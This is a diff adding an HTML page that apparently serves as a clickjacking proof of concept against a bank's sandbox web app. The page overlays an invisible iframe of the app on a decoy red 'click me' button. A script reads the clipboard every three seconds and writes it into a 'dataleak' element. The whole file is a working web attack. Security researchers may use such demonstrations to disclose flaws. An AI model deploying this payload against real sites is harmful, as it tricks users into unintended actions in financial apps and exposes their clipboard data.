@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title></title>
+  </head>
+  <body>
+    <style media="screen">
+       #leak {
+       opacity: 0;
+       width: 550px;
+       height: 500px;
+     }
+     #content {
+        position: relative;
+      }
+    #btn {
+     border-radius: 25px;
+     padding: 0px;
+     text-align: center;
+     vertical-align: middle;
+     line-height: 35px;
+     position:absolute;
+     background-color:red;
+     top: 15%;
+     left: 5%;
+     width: 100px;
+     height: 40px;
+   }
+   </style>
+   <div id="dataleak">
+
+   </div>
+   <div id=btn>
+     click me
+   </div>
+   <div id=content>
+    <iframe id=leak src="https://sandbox.openbank.stone.com.br/app/#/inicio" width="500" height="1000"></iframe>
+    </div>
+    <script>
+      setInterval(function(){
+        navigator.clipboard.readText().then(function(text){
+            dataleak.innerHTML="<b>"+text+"</b>"
+        })
+      },3000);
+
+    </script>
+  </body>
+</html>
